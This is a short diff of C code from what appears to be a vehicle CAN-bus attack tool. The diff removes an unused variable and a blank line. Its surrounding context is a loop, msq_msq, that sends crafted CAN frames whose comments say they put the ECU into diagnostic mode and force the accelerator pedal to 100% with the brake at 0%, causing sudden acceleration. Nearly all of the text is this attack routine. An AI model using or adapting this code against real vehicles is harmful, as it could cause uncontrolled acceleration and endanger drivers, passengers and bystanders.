@@ -10,7 +10,6 @@ reset ECU and make sudde acceleration
 (break pedal depth 0% && accel pedal depth 100%)
 ==================================================================*/
 void msq_msq(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
-    struct can_frame frame;
 
     do {
         // resetpayload1 [enter diag mode]
@@ -22,7 +21,6 @@ void msq_msq(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
         send_can_packet(socket, addr, msq.payload3, msq.payload1_len, 0x24);
         // accelpayload2 [make accel pedal depth 100%]
         send_can_packet(socket, addr, msq.payload4, msq.payload1_len, 0x39);
-
 
         if (time_diff == 0) break;
         usleep(time_diff * 1000);
